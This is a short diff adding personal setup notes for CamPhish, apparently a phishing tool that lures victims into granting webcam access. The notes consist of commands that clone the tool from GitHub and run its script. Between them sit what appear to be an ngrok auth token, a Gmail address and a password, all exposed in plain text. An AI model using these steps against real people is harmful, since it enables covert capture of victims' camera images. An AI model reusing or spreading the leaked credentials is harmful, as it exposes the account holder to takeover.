@@ -1,0 +1,6 @@
+git clone https://github.com/techchipnet/CamPhish
+2R7LgJWQGAoGEZeL24MHdygcuXq_5i6HPAx8FtfLQKxCNAtP1 
+matisse414@gmail.com 
+Tyzon06ngrok
+cd CamPhish 
+bash camphish.sh
